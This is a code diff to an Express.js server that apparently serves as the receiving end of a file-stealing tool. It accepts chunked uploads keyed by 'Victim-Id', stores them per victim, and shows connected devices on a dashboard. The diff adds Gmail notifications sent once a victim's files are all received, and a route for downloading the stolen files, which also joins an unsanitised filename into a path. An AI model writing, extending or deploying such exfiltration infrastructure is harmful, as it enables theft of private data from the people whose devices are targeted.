@@ -6,24 +6,24 @@ const nodemailer = require('nodemailer');
 const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 8080;
+const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically
 
-// Enable CORS
+// Enable CORS with specific options
 const corsOptions = {
   origin: 'https://deobfrontend-n6m566v6o-2naseernoors-projects.vercel.app',
   methods: ['GET', 'POST', 'OPTIONS'],
-  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks', 'Total-Files'],
+  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
   credentials: true,
 };
 app.use(cors(corsOptions));
 
-// Middleware for logging
+// Log all incoming requests for debugging
 app.use((req, res, next) => {
   console.log('📥 Request:', req.method, req.url, 'Headers:', req.headers);
   next();
 });
 
-// Handle OPTIONS request for /upload
+// Handle OPTIONS requests for /upload
 app.options('/upload', (req, res) => {
   res.header('Access-Control-Allow-Origin', corsOptions.origin);
   res.header('Access-Control-Allow-Methods', corsOptions.methods.join(', '));
@@ -32,7 +32,7 @@ app.options('/upload', (req, res) => {
   res.status(204).end();
 });
 
-// Serve dashboard
+// Serve the dashboard as static files
 app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
 
 app.get('/dashboard/', (req, res) => {
@@ -42,18 +42,26 @@ app.get('/dashboard/', (req, res) => {
 // Middleware to handle raw binary data for file uploads
 app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));
 
-// Base directory for storing received files
+// Base directory for storing files
 const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
 if (!fs.existsSync(OUTPUT_BASE_DIR)) {
   fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
 }
 
-// Track victims and their transfer statistics
+// Email Setup (Check if environment variables are available)
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: process.env.EMAIL_USER || '',
+    pass: process.env.EMAIL_PASS || '',
+  },
+});
+
 const victimFolders = {};
 const victimFileCounts = {};
 const victimTotalFiles = {};
+const victimFiles = {};
 const connectedDevices = {};
-const victimTransferTimes = {}; // Stores start and end times
 
 // Function to send email
 async function sendEmail(victimId, files) {
@@ -104,7 +112,7 @@ async function sendEmail(victimId, files) {
   }
 }
 
-// Function to check if all files are received
+// Function to check if all files are received and send email
 async function checkAndSendEmail(victimId, victimFolder) {
   const filesInFolder = fs.readdirSync(victimFolder);
   if (filesInFolder.length === victimTotalFiles[victimId]) {
@@ -116,6 +124,7 @@ async function checkAndSendEmail(victimId, victimFolder) {
       return { name: filename, type: path.extname(filename).substring(1), size: stats.size };
     });
 
+    victimFiles[victimId] = files;
     sendEmail(victimId, files);
   }
 }
@@ -149,9 +158,6 @@ app.post('/upload', (req, res) => {
       fs.mkdirSync(victimFolders[victimId], { recursive: true });
       victimFileCounts[victimId] = 0;
       victimTotalFiles[victimId] = parseInt(req.headers['total-files'], 10);
-
-      // Track start time for first file
-      victimTransferTimes[victimId] = { startTime: Date.now(), endTime: null };
     }
 
     const victimFolder = victimFolders[victimId];
@@ -168,15 +174,6 @@ app.post('/upload', (req, res) => {
       connectedDevices[victimId].filesTransferred += 1;
       connectedDevices[victimId].fileList.push(filename);
 
-      // Update end time when any file is received
-      victimTransferTimes[victimId].endTime = Date.now();
-
-      // Log total transfer time if all files are received
-      if (victimFileCounts[victimId] === victimTotalFiles[victimId]) {
-        const totalTime = victimTransferTimes[victimId].endTime - victimTransferTimes[victimId].startTime;
-        console.log(`⏱️ Total transfer time for victim ${victimId}: ${totalTime} ms`);
-      }
-
       checkAndSendEmail(victimId, victimFolder);
       res.status(200).json({ message: 'File received successfully' });
     });
@@ -189,6 +186,34 @@ app.post('/upload', (req, res) => {
 // Route to provide dashboard data
 app.get('/dashboard-data', (req, res) => {
   res.json(connectedDevices);
+});
+
+// Route to download files
+app.get('/download/:victimId/:filename', (req, res) => {
+  try {
+    const { victimId, filename } = req.params;
+    
+    if (!victimFolders[victimId]) {
+      return res.status(404).json({ error: 'Victim folder not found' });
+    }
+
+    const victimFolder = victimFolders[victimId];
+    const filePath = path.join(victimFolder, filename);
+
+    if (!fs.existsSync(filePath)) {
+      return res.status(404).json({ error: 'File not found' });
+    }
+
+    res.download(filePath, filename, (err) => {
+      if (err) {
+        console.error(`❌ Error sending file:`, err);
+        res.status(500).json({ error: 'Error sending file' });
+      }
+    });
+  } catch (error) {
+    console.error(`❌ Error in download route:`, error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
 // Start the server
